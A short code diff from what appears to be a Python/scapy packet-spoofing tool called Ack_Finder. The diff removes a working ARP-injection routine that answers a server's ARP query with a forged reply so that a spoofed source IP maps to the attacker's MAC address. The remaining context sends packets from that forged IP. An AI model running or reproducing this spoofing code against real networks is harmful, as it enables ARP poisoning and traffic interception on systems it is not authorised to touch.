@@ -45,20 +45,7 @@ class Ack_Finder:
         self.cost_time = -1
 
     def arp_inject(self):
-        pkt = sniff(filter="arp " + "and dst " + self.forge_ip + " and ether src " + self.server_mac_addr,
-                    iface=self.bind_if_name, timeout=0.5, count=1, started_callback=
-                    lambda: send(IP(src=self.forge_ip, dst=self.server_ip) / UDP(dport=80),
-                                 iface=self.bind_if_name, verbose=False))
-
-        if len(pkt) == 1 and pkt[0][1].fields['psrc'] == self.server_ip and pkt[0][1].fields['pdst'] == self.forge_ip:
-            send(ARP(pdst=self.server_ip, hwdst=self.server_mac_addr, psrc=self.forge_ip, hwsrc=self.my_mac_addr, op=2),
-                 iface=self.bind_if_name, verbose=False)
-
-        time.sleep(1)
-
-        if not self.__finish:
-            ts = threading.Thread(target=self.arp_inject)
-            ts.start()
+        return
 
     def tcp_fragment(self):
         send(IP(src=self.forge_ip, dst=self.server_ip) /
